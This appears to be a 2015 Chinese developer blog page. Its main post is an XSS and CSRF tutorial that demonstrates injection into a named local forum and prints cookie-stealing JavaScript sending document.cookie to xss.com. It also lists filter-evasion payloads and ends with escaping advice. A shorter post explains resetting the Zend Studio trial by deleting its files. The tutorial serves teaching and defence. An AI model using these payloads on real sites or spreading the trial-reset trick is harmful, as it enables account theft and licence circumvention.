<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>王桐的技术博客</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="王桐的技术博客，Web开发领域">
<meta property="og:type" content="website">
<meta property="og:title" content="王桐的技术博客">
<meta property="og:url" content="http://3wbuild.com/page/2/index.html">
<meta property="og:site_name" content="王桐的技术博客">
<meta property="og:description" content="王桐的技术博客，Web开发领域">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="王桐的技术博客">
<meta name="twitter:description" content="王桐的技术博客，Web开发领域">
  
    <link rel="alternative" href="/atom.xml" title="王桐的技术博客" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  <link rel="stylesheet" href="/css/style.css" type="text/css">
  

</head>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">王桐的技术博客</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">技术博客，PHP, Go, Mysql, Linux, Redis</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://3wbuild.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-网站安全之ｘｓｓ／ｃｒｓｆ" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/a/网站安全之ｘｓｓ／ｃｒｓｆ/" class="article-date">
  <time datetime="2015-11-13T08:42:54.000Z" itemprop="datePublished">2015-11-13</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/安全/">安全</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/a/网站安全之ｘｓｓ／ｃｒｓｆ/">网站安全之ｘｓｓ／ｃｒｓｆ</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="XSS脚本攻击"><a href="#XSS脚本攻击" class="headerlink" title="XSS脚本攻击"></a>XSS脚本攻击</h2><p>XSS是什么？它的全名是：Cross-site scripting，为了和CSS层叠样式表区分，所以取名XSS。它是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML标签以及用户端脚本语言。</p>
<h3 id="名城苏州网站注入"><a href="#名城苏州网站注入" class="headerlink" title="　　名城苏州网站注入"></a>　　名城苏州网站注入</h3><p>XSS注入常见的重灾区是社交网站和论坛，越是让用户自由输入内容的地方，我们就越要关注其能否抵御XSS攻击。XSS注入的攻击原理很简单，构造一些非法的url地址或js脚本让HTML标签溢出，从而造成注入。一般引诱用户点击才触发的漏洞我们称为反射性漏洞，用户打开页面就触发的称为注入型漏洞，当然注入型漏洞的危害更大一些。下面先用一个简单的实例来说明XSS注入无处不在。</p>
<p>名城苏州（www.2500sz.com)，是苏州本地门户网站，日均的pv数也达到了150万，它的论坛用户数很多，是本地化新闻、社区论坛做的比较成功的一个网站。</p>
<p>接下来我们将演示一个注入到2500sz.com的案例，我们先注册成一个2500sz.com站点会员，进入论坛板块，开始发布新帖。打开发帖页面，在web<a href="http://cpro.baidu.com/cpro/ui/uijs.php?adclass=0&amp;app_id=0&amp;c=news&amp;cf=1001&amp;ch=0&amp;di=128&amp;fv=0&amp;is_app=0&amp;jk=95c351b31afbdc06&amp;k=%B1%E0%BC%AD%C6%F7&amp;k0=%B1%E0%BC%AD%C6%F7&amp;kdi0=0&amp;luki=3&amp;n=10&amp;p=baidu&amp;q=06011078_cpr&amp;rb=0&amp;rs=1&amp;seller_id=1&amp;sid=6dcfb1ab351c395&amp;ssp2=1&amp;stid=0&amp;t=tpclicked3_hc&amp;td=1922429&amp;tu=u1922429&amp;u=http%3A%2F%2Fwww%2Eadmin10000%2Ecom%2Fdocument%2F4182%2Ehtml&amp;urlid=0" target="_blank" rel="external">编辑器</a>中输入如下内容：</p>
<p><img src="http://www.admin10000.com/UploadFiles/Document/201404/07/20140407092037854689.JPG" alt=""></p>
<p>上面的代码即为分享一个网络图片，我们在图片的src属性中直接写入了<a href="http://cpro.baidu.com/cpro/ui/uijs.php?adclass=0&amp;app_id=0&amp;c=news&amp;cf=1001&amp;ch=0&amp;di=128&amp;fv=0&amp;is_app=0&amp;jk=95c351b31afbdc06&amp;k=javascript&amp;k0=javascript&amp;kdi0=0&amp;luki=4&amp;n=10&amp;p=baidu&amp;q=06011078_cpr&amp;rb=0&amp;rs=1&amp;seller_id=1&amp;sid=6dcfb1ab351c395&amp;ssp2=1&amp;stid=0&amp;t=tpclicked3_hc&amp;td=1922429&amp;tu=u1922429&amp;u=http%3A%2F%2Fwww%2Eadmin10000%2Ecom%2Fdocument%2F4182%2Ehtml&amp;urlid=0" target="_blank" rel="external">javascript</a>:alert(‘xss’);，操作成功后生成帖子，用IE6、7的用户打开此帖子就会出现下图的alert(‘xss’)弹窗。</p>
<p><img src="http://www.admin10000.com/UploadFiles/Document/201404/07/20140407092037002853.JPG" alt=""></p>
<p>当然我们要将标题设计的非常夺人眼球，比如“Pm2.5雾霾真相披露” ，然后将里面的alert换成如下恶意代码：</p>
<p><pre>location.href=’<a href="http://www.xss.com?cookie=&#39;+document.cookie；" target="_blank" rel="external">http://www.xss.com?cookie=&#39;+document.cookie；</a></pre><br>这样我们就获取到了用户cookie的值，如果服务端session设置过期很长的话，以后就可以伪造这个用户的身份成功登录而不再需要用户名密码，关于session和cookie的关系我们在下一节中将会详细讲到。这里的location.href只是出于简单，如果做了跳转这个帖子很快会被管理员删除，但我们写如下代码，并且帖子的内容也是真实的，那么就会祸害很多人：</p>
<p><pre>var img = document.createElement(‘img’);<br>img.src=’<a href="http://www.xss.com?cookie=&#39;+document.cookie" target="_blank" rel="external">http://www.xss.com?cookie=&#39;+document.cookie</a>;<br>img.style.display=’none’;<br>document.getElementsByTagName(‘body’)[0].appendChild(img);</pre><br>这样就神不知鬼不觉的把当前用户cookie的值发送到恶意站点，恶意站点通过GET参数，就能获取用户cookie的值。通过这个方法可以拿到用户各种各样的私密数据。</p>
<h3 id="Ajax的XSS注入"><a href="#Ajax的XSS注入" class="headerlink" title="　　Ajax的XSS注入"></a>　　Ajax的XSS注入</h3><p>另一处容易造成XSS注入的地方是Ajax的不正确使用。</p>
<p>比如有这样的一个场景，在一篇博文的详细页，很多用户给这篇博文留言，为了加快页面加载速度，项目经理要求先显示博文的内容，然后通过Ajax去获取留言的第一页信息，留言功能通过Ajax分页保证了页面的无刷新和快速加载，此做法的好处有：</p>
<p>（1）加快了博文详细页的加载，提升了用户体验，因为留言信息往往有用户头像、昵称、id等等，需要多表查询，且一般用户会先看博文，再拉下去看留言，这时留言已加载完毕。</p>
<p>（2）Ajax的留言分页能更快速响应，用户不必每次分页都让博文重新刷新。</p>
<p>于是前端工程师从PHP那获取了json数据之后，将数据放入DOM文档中，大家能看出下面代码的问题吗？</p>
<p><pre>var commentObj = $(‘#comment’);<br>$.get(‘/getcomment’, {r:Math.random(),page:1,article_id:1234},function(data){<br>    //通过Ajax获取评论内容，然后将品论的内容一起加载到页面中<br>    if(data.state !== 200)  return commentObj.html(‘留言加载失败。’)<br>    commentObj.html(data.content);<br>},’json’);</pre><br>我们设计的初衷是，PHP程序员将留言内容套入模板，返回json格式数据，示例如下：</p>
<p><pre>{“state”:200, “content”:”模板的字符串片段”}</pre><br>如果没有看出问题，大家可以打开firebug或者chrome的开发人员工具，直接把下面代码粘贴到有JQuery插件的网站中运行：</p>
<p><pre>$(‘div:first’).html(‘&lt;div&gt;&lt;script&gt;alert(“xss”)&lt;/script&gt;&lt;div&gt;’);</pre><br>正常弹出了alert框，你可能觉得这比较小儿科。</p>
<p>如果PHP程序员已经转义了尖括号&lt;&gt;还有单双引号”‘，那么上面的恶意代码会被漂亮的变成如下字符输出到留言内容中:</p>
<p><pre>$(‘div:first’).html(‘&lt;script&gt; alert(“xss”)&lt;/script&gt; ‘);</pre><br>这里我们需要表扬一下PHP程序员，可以将一些常规的XSS注入都屏蔽掉，但是在utf-8编码中，字符还有另一种表示方式，那就是unicode码，我们把上面的恶意字符串改写成如下：</p>
<p><pre> $(‘div:first’).html(‘<br>\u003c \u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0061\u006c \u0065\u0072\u0074<br>\u0028 \u0022\u0078\u0073\u0073\u0022\u0029\u003c \u002f\u0073 \u0063\u0072\u0069\<br>u0070\u0074\u003e’);</pre><br>大家发现还是输出了alert框，只是这次需要将写好的恶意代码放入转码工具中做下转义，webqq曾经就爆出过上面这种unicode码的XSS注入漏洞，另外有很多反射型XSS漏洞因为过滤了单双引号，所以必须使用这种方式进行注入。</p>
<h3 id="base64注入"><a href="#base64注入" class="headerlink" title="　　base64注入"></a>　　base64注入</h3><p>除了比较老的ie6、7浏览器，一般浏览器在加载一些图片资源的时候我们可以使用base64编码显示指定图片，比如下面这段base64编码：</p>
<p><pre>&lt;img src=”data:image/png;base64,iVBORw0KGgoAAAANSUhEU (… 省略若干字符)<br>AAAASUVORK5CYII=” /&gt;</pre><br>表示的就是一张Node.js官网的logo，图片如下：</p>
<p><img src="http://www.admin10000.com/UploadFiles/Document/201404/07/20140407092037789767.PNG" alt=""></p>
<p>我们一般使用这样的技术把一些网站常用的logo或者小图标转存成为base64编码，进而减少一次客户端向<a href="http://cpro.baidu.com/cpro/ui/uijs.php?adclass=0&amp;app_id=0&amp;c=news&amp;cf=1001&amp;ch=0&amp;di=128&amp;fv=0&amp;is_app=0&amp;jk=95c351b31afbdc06&amp;k=%B7%FE%CE%F1%C6%F7&amp;k0=%B7%FE%CE%F1%C6%F7&amp;kdi0=0&amp;luki=5&amp;n=10&amp;p=baidu&amp;q=06011078_cpr&amp;rb=0&amp;rs=1&amp;seller_id=1&amp;sid=6dcfb1ab351c395&amp;ssp2=1&amp;stid=0&amp;t=tpclicked3_hc&amp;td=1922429&amp;tu=u1922429&amp;u=http%3A%2F%2Fwww%2Eadmin10000%2Ecom%2Fdocument%2F4182%2Ehtml&amp;urlid=0" target="_blank" rel="external">服务器</a>的请求，加快用户加载页面速度。</p>
<p>我们还可以把HTML页面的代码隐藏在data属性之中，比如下面的代码将打开一个hello world的新页面。</p>
<p><pre>&lt;a href=”data:text/html;ascii,&lt;html&gt;&lt;title&gt;hello&lt;/title&gt;&lt;body&gt;hello world<br>&lt;/body&gt;&lt;/html&gt;”&gt;click me&lt;/a&gt;</pre><br>根据这样的特性，我们就可以尝试把一些恶意的代码转存成为base64编码格式，然后注入到a标签里去，从而形成反射型XSS漏洞，我们编码如下代码。</p>
<p><pre>&lt;img src=x onerror=alert(1)&gt;</pre><br>经过base64编码之后的恶意代码如下。</p>
<p><pre>&lt;a href=”data:text/html;base64, PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==”&gt;base64 xss&lt;/a&gt;</pre><br>用户在点击这个超链接之后，就会执行如上的恶意alert弹窗，就算网站开发者过滤了单双引号”,’和左右尖括号&lt;&gt;，注入还是能够生效的。</p>
<p>不过这样的注入因为跨域的问题，恶意脚本是无法获取网站的cookie值。另外如果网站提供我们自定义flash路径，也是可以使用相同的方式进行注入的，下面是一段规范的在网页中插入flash的代码：</p>
<p><pre>&lt;object type=”application/x-shockwave-flash” data=”movie.swf” width=”400” height=”300”&gt;<br>&lt;param name=”movie” value=”movie.swf” /&gt;<br>&lt;/object&gt;</pre><br>把data属性改写成如下恶意内容，也能够通过base64编码进行注入攻击：</p>
<p><pre>&lt;script&gt;alert(“Hello”);&lt;/script&gt;</pre><br>经过编码过后的注入内容：</p>
<p><pre>&lt;object data=”data:text/html;base64, PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=”&gt;&lt;/object&gt;</pre><br>用户在打开页面后，会弹出alert框，但是在chrome浏览器中是无法获取到用户cookie的值，因为chrome会认为这个操作不安全而禁止它，看来我们的浏览器为用户安全也做了不少的考虑。</p>
<h3 id="常用注入方式"><a href="#常用注入方式" class="headerlink" title="　　常用注入方式"></a>　　常用注入方式</h3><p>注入的根本目的就是要HTML标签溢出，从而执行攻击者的恶意代码，下面是一些常用攻击手段：</p>
<p>（1）alert(String.fromCharCode(88,83,83))，通过获取字母的ascii码来规避单双引号，这样就算网站过滤掉单双引号也还是可以成功注入的。</p>
<p>（2）&lt;IMG SRC=JaVaScRiPt:alert(‘XSS’)&gt;，通过注入img标签来达到攻击的目的，这个只对ie6和ie7下有效，意义不大。</p>
<p>（3）&lt;IMG SRC=””onerror=”alert(‘xxs’)”&gt;，如果能成功闭合img标签的src属性，那么加上onload或者onerror事件可以更简单的让用户遭受攻击。</p>
<p>（4）&lt;IMG SRC=<a href="http://cpro.baidu.com/cpro/ui/uijs.php?adclass=0&amp;app_id=0&amp;c=news&amp;cf=1001&amp;ch=0&amp;di=128&amp;fv=0&amp;is_app=0&amp;jk=95c351b31afbdc06&amp;k=javascript&amp;k0=javascript&amp;kdi0=0&amp;luki=4&amp;n=10&amp;p=baidu&amp;q=06011078_cpr&amp;rb=0&amp;rs=1&amp;seller_id=1&amp;sid=6dcfb1ab351c395&amp;ssp2=1&amp;stid=0&amp;t=tpclicked3_hc&amp;td=1922429&amp;tu=u1922429&amp;u=http%3A%2F%2Fwww%2Eadmin10000%2Ecom%2Fdocument%2F4182%2Ehtml&amp;urlid=0" target="_blank" rel="external">javascript</a>:alert(‘XSS’)&gt;，这种方式也只有对ie6奏效。</p>
<p>（5）&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;，&lt;IMG SRC=java\0script:alert(\”XSS\”)&gt;，&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;，我们也可以把关键字Javascript分开写，避开一些简单的验证，这种方式ie6统统中招，所以ie6真不是安全的浏览器。</p>
<p>（6）&lt;LINK REL=”stylesheet” HREF=”javascript:alert(‘XSS’);”&gt;，通过样式表也能注入。</p>
<p>（7）&lt;STYLE&gt;@im\port’\ja\vasc\ript:alert(“XSS”)’;&lt;/STYLE&gt;,如果可以自定义style样式，也可能被注入。</p>
<p>（8）&lt;IFRAME SRC=”<a href="http://cpro.baidu.com/cpro/ui/uijs.php?adclass=0&amp;app_id=0&amp;c=news&amp;cf=1001&amp;ch=0&amp;di=128&amp;fv=0&amp;is_app=0&amp;jk=95c351b31afbdc06&amp;k=javascript&amp;k0=javascript&amp;kdi0=0&amp;luki=4&amp;n=10&amp;p=baidu&amp;q=06011078_cpr&amp;rb=0&amp;rs=1&amp;seller_id=1&amp;sid=6dcfb1ab351c395&amp;ssp2=1&amp;stid=0&amp;t=tpclicked3_hc&amp;td=1922429&amp;tu=u1922429&amp;u=http%3A%2F%2Fwww%2Eadmin10000%2Ecom%2Fdocument%2F4182%2Ehtml&amp;urlid=0" target="_blank" rel="external">javascript</a>:alert(‘XSS’);”&gt;&lt;/IFRAME&gt;，iframe的标签也可能被注入。</p>
<p>（9）&lt;a href=”javasc ript:alert(1)”&gt;click&lt;/a&gt;，利用 伪装换行，:伪装冒号，从而避开对Javascript关键字以及冒号的过滤。</p>
<p>其实XSS注入过程充满智慧，只要你反复尝试各种技巧，就可能在网站的某处攻击成功。总之，发挥你的想象力去注入吧，最后别忘了提醒下站长哦。更多XSS注入方式参阅：(XSS Filter Evasion Cheat Sheet)[<a href="https://www.owasp.org/index.php/XSSFilterEvasionCheatSheet" target="_blank" rel="external">https://www.owasp.org/index.php/XSSFilterEvasionCheatSheet</a>]</p>
<h3 id="防范措施"><a href="#防范措施" class="headerlink" title="　　防范措施"></a>　　防范措施</h3><p>对于防范XSS注入，其实只有两个字过滤，一定要对用户提交上来的数据保持怀疑，过滤掉其中可能注入的字符，这样才能保证应用的安全。另外，对于入库时过滤还是读库时过滤，这就需要根据应用的类型来进行选择了。下面是一个简单的过滤HTML标签的<a href="http://cpro.baidu.com/cpro/ui/uijs.php?adclass=0&amp;app_id=0&amp;c=news&amp;cf=1001&amp;ch=0&amp;di=128&amp;fv=0&amp;is_app=0&amp;jk=95c351b31afbdc06&amp;k=%BA%AF%CA%FD&amp;k0=%BA%AF%CA%FD&amp;kdi0=0&amp;luki=1&amp;n=10&amp;p=baidu&amp;q=06011078_cpr&amp;rb=0&amp;rs=1&amp;seller_id=1&amp;sid=6dcfb1ab351c395&amp;ssp2=1&amp;stid=0&amp;t=tpclicked3_hc&amp;td=1922429&amp;tu=u1922429&amp;u=http%3A%2F%2Fwww%2Eadmin10000%2Ecom%2Fdocument%2F4182%2Ehtml&amp;urlid=0" target="_blank" rel="external">函数</a>代码：</p>
<p><pre>var escape = function(html){<br>  return String(html)<br>    .replace(/&amp;(?!\w+;)/g, ‘&amp;’)<br>    .replace(/&lt;/g, ‘&lt;’)<br>    .replace(/&gt;/g, ‘&gt;’)<br>    .replace(/“/g, ‘“‘)<br>    .replace(/‘/g, ‘’’);<br>};</pre><br>不过上述的过滤方法会把所有HTML标签都转义，如果我们的网站应用确实有自定义HMTL标签的需求的话，它就力不从心了。这里我推荐一个过滤XSS注入的模块，由本书另一位作者老雷提供：<a href="https://github.com/leizongmin/js-xss" target="_blank" rel="external">js-xss</a></p>
<h2 id="CSRF请求伪造"><a href="#CSRF请求伪造" class="headerlink" title="　CSRF请求伪造"></a>　CSRF请求伪造</h2><p>CSRF是什么呢？CSRF全名是Cross-site request forgery，是一种对网站的恶意利用，CSRF比XSS更具危险性。</p>
<h3 id="Session详解"><a href="#Session详解" class="headerlink" title="　　Session详解"></a>　　Session详解</h3><p>想要深入理解CSRF攻击的特性，我们必须了解网站session的工作原理。</p>
<p>session我想大家都不会陌生，无论你用Node.js或PHP开发过网站的肯定都用过session对象，假如我把浏览器的cookie禁用了，大家认为session还能正常工作吗？</p>
<p>答案是否定的，我举个简单的例子来帮助大家理解session的含义。</p>
<p>比如我办了一张超市的储值会员卡，我能享受部分商品打折的优惠，我的个人资料以及卡内余额都是保存在超市会员数据库里的。每次结账时，出示会员卡超市便能知道我的身份，随即进行打折优惠并扣除卡内相应余额。</p>
<p>这里我们的会员卡卡号就相当于保存在cookie中的sessionid，而我的个人信息就是保存在服务端的session对象，因为cookie有两个重要特性，（1）同源性，保证了cookie不会跨域发送造成泄密；（2）附带性，保证每次请求服务端都会在请求头中带上cookie信息。也就是这两个特性为我们识别用户带来的便利，因为HTTP协议是无状态的，我们之所以知道请求用户的身份，其实就是获取了用户请求头中的cookie信息。</p>
<p>当然session对象的保存方法多种多样，可以保存在文件中，也可以是内存里。考虑到分布式的横向扩展，我们还是建议生产环境把它保存在第三方媒介中，比如redis或者mongodb，默认的express框架是将session对象保存在内存里的。</p>
<p>除了用cookie保存sessionid，我们还可以使用url参数来保存sessionid，只不过每次请求都需要在url里带上这个参数，根据这个参数，我们就能识别此次请求的用户身份了。</p>
<p>另外近阶段利用Etag来保存sessionid也被使用在用户行为跟踪上，Etag是静态资源<a href="http://cpro.baidu.com/cpro/ui/uijs.php?adclass=0&amp;app_id=0&amp;c=news&amp;cf=1001&amp;ch=0&amp;di=128&amp;fv=0&amp;is_app=0&amp;jk=95c351b31afbdc06&amp;k=%B7%FE%CE%F1%C6%F7&amp;k0=%B7%FE%CE%F1%C6%F7&amp;kdi0=0&amp;luki=5&amp;n=10&amp;p=baidu&amp;q=06011078_cpr&amp;rb=0&amp;rs=1&amp;seller_id=1&amp;sid=6dcfb1ab351c395&amp;ssp2=1&amp;stid=0&amp;t=tpclicked3_hc&amp;td=1922429&amp;tu=u1922429&amp;u=http%3A%2F%2Fwww%2Eadmin10000%2Ecom%2Fdocument%2F4182%2Ehtml&amp;urlid=0" target="_blank" rel="external">服务器</a>对用户请求头中if-none-match的响应，一般我们第一次请求某一个静态资源是不会带上任何关于缓存信息的请求头的，这时候静态资源服务器根据此资源的大小和最终修改时间，哈希计算出一个字符串作为Etag的值响应给客户端，如下图：</p>
<p><img src="http://www.admin10000.com/UploadFiles/Document/201404/07/20140407092037325038.PNG" alt=""></p>
<p>第二次当我们再访问这个静态资源的时候，由于本地浏览器具有此图片的缓存，但是不确定服务器是否已经更新掉了这个静态资源，所以在发起请求的时候会带上if-none-match参数，其值就是上次请求服务器响应的Etag值。服务器接收到这个if-none-match的值，再根据原算法去生成Etag值，进行比对。如果两个值相同，则说明该静态资源没有被更新，于是响应状态码304，告诉浏览器放心的使用本地缓存，远程资源没有更新，结果如下图：</p>
<p><img src="http://www.admin10000.com/UploadFiles/Document/201404/07/20140407092037233874.PNG" alt=""></p>
<p>当然如果远程资源有变动，则<a href="http://cpro.baidu.com/cpro/ui/uijs.php?adclass=0&amp;app_id=0&amp;c=news&amp;cf=1001&amp;ch=0&amp;di=128&amp;fv=0&amp;is_app=0&amp;jk=95c351b31afbdc06&amp;k=%B7%FE%CE%F1%C6%F7&amp;k0=%B7%FE%CE%F1%C6%F7&amp;kdi0=0&amp;luki=5&amp;n=10&amp;p=baidu&amp;q=06011078_cpr&amp;rb=0&amp;rs=1&amp;seller_id=1&amp;sid=6dcfb1ab351c395&amp;ssp2=1&amp;stid=0&amp;t=tpclicked3_hc&amp;td=1922429&amp;tu=u1922429&amp;u=http%3A%2F%2Fwww%2Eadmin10000%2Ecom%2Fdocument%2F4182%2Ehtml&amp;urlid=0" target="_blank" rel="external">服务器</a>会响应一份新的资源给浏览器，并且Etag的值也会不同。根据这样的一个特性，我们可以得出结论，在用户第一次请求某一个静态资源的时候我们响应给它一个全局唯一的Etag值，在用户不清空缓存的情况下，用户下次再请求到服务器，还是会带上同一个Etag值的，于是我们可以利用这个值作为sessionid，而我们在服务器端保存这些Etag值和用户信息的对应关系，也就可以利用Etag来标识出用户身份了。</p>
<h3 id="CSRF的危害性"><a href="#CSRF的危害性" class="headerlink" title="　　CSRF的危害性"></a>　　CSRF的危害性</h3><p>在我们理解了session的工作机制后，CSRF攻击也就很容易理解了。CSRF攻击就相当于恶意用户复制了我的会员卡，用我的会员卡享受购物的优惠折扣，更可以使用我购物卡里的余额购买他的东西！</p>
<p>CSRF的危害性已经不言而喻了，恶意用户可以伪造某一个用户的身份给其好友发送垃圾信息，这些垃圾信息的超链接可能带有木马程序或者一些诈骗信息（比如借钱之类的）。如果发送的垃圾信息还带有蠕虫链接的话，接收到这些有害信息的好友一旦打开私信中的链接，就也成为了有害信息的散播者，这样数以万计的用户被窃取了资料、种植了木马。整个网站的应用就可能在短时间内瘫痪。</p>
<p>MSN网站，曾经被一个美国的19岁小伙子Samy利用css的background漏洞几小时内让100多万用户成功的感染了他的蠕虫，虽然这个蠕虫并没有破坏整个应用，只是在每一个用户的签名后面都增加了一句“Samy 是我的偶像”，但是一旦这些漏洞被恶意用户利用，后果将不堪设想。同样的事情也曾经发生在新浪微博上。</p>
<p>想要CSRF攻击成功，最简单的方式就是配合XSS注入，所以千万不要小看了XSS注入攻击带来的后果，不是alert一个对话框那么简单，XSS注入仅仅是第一步！</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://3wbuild.com/a/网站安全之ｘｓｓ／ｃｒｓｆ/" data-id="cipqlt2bv000dhypdhrcmtw8y" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-实现_PHP5.4中_jso_ecode($str,_JSON_UNESCAPED_UNICODE)" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/a/实现_PHP5.4中_jso_ecode($str,_JSON_UNESCAPED_UNICODE)/" class="article-date">
  <time datetime="2015-10-16T11:52:53.000Z" itemprop="datePublished">2015-10-16</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/PHP/">PHP</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/a/实现_PHP5.4中_jso_ecode($str,_JSON_UNESCAPED_UNICODE)/">实现 PHP5.4中 json_encode($str, JSON_UNESCAPED_UNICODE)</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>/**</p>
<ul>
<li>实现 PHP5.4中 json_encode($str, JSON_UNESCAPED_UNICODE)<br><em>/<br>private function decodeUnicode($str)<br>{<br>return preg_replace_callback(‘/\\u([0-9a-f]{4})/i’, create_function( ‘$matches’, ‘return mb_convert_encoding(pack(“H</em>“, $matches[1]), “UTF-8”, “UCS-2BE”);’ ), $str);<br>}</li>
</ul>
<p>&nbsp;</p>
<p>$data = array(<br>‘header’=&gt;array(<br>‘appid’ =&gt; $appid,<br>‘sign’ =&gt; md5($appid.$this-&gt;decodeUnicode(json_encode($info)).$key),<br>),<br>‘body’=&gt; $info,<br>);<br>//dump(json_encode($data));<br>$Http = new Http();<br>$res = $Http-&gt;curlPost($url,array(‘data’=&gt;base64_encode(json_encode($data))),’’, false, 30);</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://3wbuild.com/a/实现_PHP5.4中_jso_ecode($str,_JSON_UNESCAPED_UNICODE)/" data-id="cipqlt2ck0029hypdrkbbdo07" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-zend-studio-12-e7-a0-b4-e8-a7-a3-e6-b0-b8-e4-b9-85-e4-bd-bf-e7-94-a8-e7-9a-84-e6-96-b9-e6-b3-95" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/a/zend-studio-12-e7-a0-b4-e8-a7-a3-e6-b0-b8-e4-b9-85-e4-bd-bf-e7-94-a8-e7-9a-84-e6-96-b9-e6-b3-95/" class="article-date">
  <time datetime="2015-06-08T01:44:27.000Z" itemprop="datePublished">2015-06-08</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/Linux/">Linux</a>►<a class="article-category-link" href="/categories/Linux/工具/">工具</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/a/zend-studio-12-e7-a0-b4-e8-a7-a3-e6-b0-b8-e4-b9-85-e4-bd-bf-e7-94-a8-e7-9a-84-e6-96-b9-e6-b3-95/">zend studio 12 破解/永久使用的方法</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>&nbsp;</p>
<p>zend studio 12 破解/永久使用的方法</p>
<p>&nbsp;</p>
<p>linux:</p>
<p>1、进入下述路径：c/users/用户名，如果你的用户名是123，那就是在下述目录：C:\Users\123<br>2、删除一个文件和两个目录：.zs（文件），.ZendStudio（目录）、.zend（目录）<br>这样大功告成，当我们再次打开后，就又恢复到30天了。</p>
<p>&nbsp;</p>
<p>&nbsp;</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://3wbuild.com/a/zend-studio-12-e7-a0-b4-e8-a7-a3-e6-b0-b8-e4-b9-85-e4-bd-bf-e7-94-a8-e7-9a-84-e6-96-b9-e6-b3-95/" data-id="cipqlt2d6003nhypd5bm34h4f" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-ubutu__lmp_php5.3_安装_Zed_Debugger" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/a/ubutu__lmp_php5.3_安装_Zed_Debugger/" class="article-date">
  <time datetime="2015-05-21T13:01:59.000Z" itemprop="datePublished">2015-05-21</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/Linux/">Linux</a>►<a class="article-category-link" href="/categories/Linux/PHP/">PHP</a>►<a class="article-category-link" href="/categories/Linux/PHP/调试/">调试</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/a/ubutu__lmp_php5.3_安装_Zed_Debugger/">ubuntu  lnmp php5.3 安装 Zend Debugger</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>ubuntu  lnmp php5.3 安装 Zend Debugger  ,花了一下午时间才搞好.</p>
<p>解决问题: <a href="http://stackoverflow.com/questions/7188149/php-5-3-5-with-zend-debugger" target="_blank" rel="external">http://stackoverflow.com/questions/7188149/php-5-3-5-with-zend-debugger</a></p>
<p>所以:  sudo apt-get install libssl0.9.8  ,才解决了问题 .</p>
<p>&nbsp;</p>
<p>配置如下:</p>
<p>[Zend Optimizer]<br>zend_extension=/usr/local/zend/ZendGuardLoader.so<br>zend_loader.enable=1<br>zend_loader.disable_licensing=0<br>zend_loader.obfuscation_level_support=3<br>zend_loader.license_path=</p>
<p>[Zend Debugger]<br>;extension=/usr/local/php/lib/php/extensions/ZendDebugger.so;<br>;zend_extension_manager.debug_server_ts=/usr/local/php/lib/php/extensions/ ZendDebugger.so<br>;zend_extension=/usr/local/php/lib/php/extensions/ZendDebugger/php-5.5.x/ ZendDebugger.so<br>;zend_extension_ts=/usr/local/php/lib/php/extensions/ZendDebugger/5_3_x_comp/ ZendDebugger.so<br>zend_extension=/usr/local/php/lib/php/extensions/ZendDebugger/5_3_x_comp/ ZendDebugger.so</p>

      
    </div>
    <footer class="article-footer">
